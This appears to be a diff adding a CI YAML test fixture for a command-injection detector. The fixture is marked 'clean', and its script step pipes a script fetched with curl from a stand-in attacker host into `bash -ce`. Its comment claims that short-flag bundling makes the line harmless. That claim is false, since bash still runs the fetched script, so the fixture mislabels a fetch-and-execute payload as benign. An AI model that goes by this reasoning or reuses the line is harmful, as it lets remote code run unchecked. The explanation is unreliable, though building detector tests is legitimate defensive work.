@@ -1,0 +1,10 @@
+# clean: a bundled short-flag group where `c` is NOT the last letter
+# (`-ce`) is not this shell's -c at all. POSIX short-flag bundling reads
+# a flag that takes an argument (-c takes the command string) only when
+# it is the trailing letter of the bundle; any letter after it, not a
+# separate word, is read as c's own argument instead. This is therefore
+# not a command-substitution invocation and must not fire.
+install:
+  image: alpine:3.19
+  script:
+    - bash -ce "$(curl -fsSL https://evil.example/i.sh)"
